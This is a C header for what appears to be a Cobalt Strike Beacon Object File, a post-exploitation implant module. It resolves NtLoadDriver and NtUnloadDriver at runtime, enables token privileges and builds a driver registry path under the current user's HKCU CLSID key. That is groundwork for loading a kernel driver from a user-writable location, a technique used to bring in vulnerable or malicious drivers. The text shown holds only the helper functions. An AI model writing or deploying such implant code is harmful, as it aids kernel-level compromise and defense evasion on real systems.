#pragma once
#include "beacon.h"
#include "ntdefs.h"

// ─── DYNAMIC API RESOLUTION ──────────────────────────────────
// Never use static imports in BOFs — always resolve at runtime

// NTDLL
#define NTDLL$NtLoadDriver \
    ((_NtLoadDriver)KERNEL32$GetProcAddress( \
        KERNEL32$GetModuleHandleA("ntdll.dll"), "NtLoadDriver"))

#define NTDLL$NtUnloadDriver \
    ((_NtUnloadDriver)KERNEL32$GetProcAddress( \
        KERNEL32$GetModuleHandleA("ntdll.dll"), "NtUnloadDriver"))

#define NTDLL$RtlInitUnicodeString \
    ((_RtlInitUnicodeString)KERNEL32$GetProcAddress( \
        KERNEL32$GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString"))

// KERNEL32
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess(VOID);
DECLSPEC_IMPORT VOID    WINAPI KERNEL32$RtlZeroMemory(PVOID, SIZE_T);

// ADVAPI32
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$LookupPrivilegeValueW(LPCWSTR, LPCWSTR, PLUID);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL,
                          PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegCreateKeyExW(HKEY, LPCWSTR, DWORD,
                          LPWSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES,
                          PHKEY, LPDWORD);
DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegSetValueExW(HKEY, LPCWSTR, DWORD,
                          DWORD, const BYTE*, DWORD);
DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegQueryValueExW(HKEY, LPCWSTR, LPDWORD,
                          LPDWORD, LPBYTE, LPDWORD);
DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegDeleteKeyW(HKEY, LPCWSTR);
DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegCloseKey(HKEY);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$GetTokenInformation(HANDLE,
                          TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$ConvertSidToStringSidW(PSID, LPWSTR*);

// ─── WSTRING HELPERS (no CRT, no wsprintfW) ──────────────────

static void wcs_copy(LPWSTR dst, LPCWSTR src) {
    while (*src) *dst++ = *src++;
    *dst = L'\0';
}

static void wcs_append(LPWSTR dst, LPCWSTR src) {
    while (*dst) dst++;
    while (*src) *dst++ = *src++;
    *dst = L'\0';
}

// ─── ENABLE PRIVILEGE ────────────────────────────────────────

static BOOL EnablePrivilege(LPCWSTR privName) {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!ADVAPI32$OpenProcessToken(
            KERNEL32$GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &hToken)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] OpenProcessToken failed: %lu\n",
            KERNEL32$GetLastError());
        return FALSE;
    }

    if (!ADVAPI32$LookupPrivilegeValueW(NULL, privName, &luid)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] LookupPrivilegeValue failed: %lu\n",
            KERNEL32$GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!ADVAPI32$AdjustTokenPrivileges(
            hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] AdjustTokenPrivileges failed: %lu\n",
            KERNEL32$GetLastError());
        return FALSE;
    }

    return TRUE;
}

// ─── GET CURRENT USER SID AS WIDE STRING ─────────────────────

static BOOL GetCurrentUserSidString(LPWSTR sidStr, DWORD maxLen) {
    HANDLE hToken        = NULL;
    BYTE   tokenBuf[256] = {0};
    DWORD  retLen        = 0;
    LPWSTR sidStrRaw     = NULL;

    if (!ADVAPI32$OpenProcessToken(
            KERNEL32$GetCurrentProcess(),
            TOKEN_QUERY, &hToken))
        return FALSE;

    ADVAPI32$GetTokenInformation(hToken, TokenUser,
        tokenBuf, sizeof(tokenBuf), &retLen);

    TOKEN_USER* pTokenUser = (TOKEN_USER*)tokenBuf;

    if (!ADVAPI32$ConvertSidToStringSidW(
            pTokenUser->User.Sid, &sidStrRaw))
        return FALSE;

    wcs_copy(sidStr, sidStrRaw);
    return TRUE;
}

// ─── BUILD HKCU REGISTRY PATH ────────────────────────────────
// fullPath     → \Registry\User\<SID>\Software\Classes\CLSID\<n>
// relativePath → Software\Classes\CLSID\<n>

static BOOL BuildRegPath(
    LPCWSTR driverName,
    LPWSTR  fullPath,
    LPWSTR  relativePath)
{
    WCHAR sid[128] = {0};
    if (!GetCurrentUserSidString(sid, 128))
        return FALSE;

    wcs_copy(fullPath,  L"\\Registry\\User\\");
    wcs_append(fullPath, sid);
    wcs_append(fullPath, L"\\Software\\Classes\\CLSID\\");
    wcs_append(fullPath, driverName);

    wcs_copy(relativePath,  L"Software\\Classes\\CLSID\\");
    wcs_append(relativePath, driverName);

    return TRUE;
}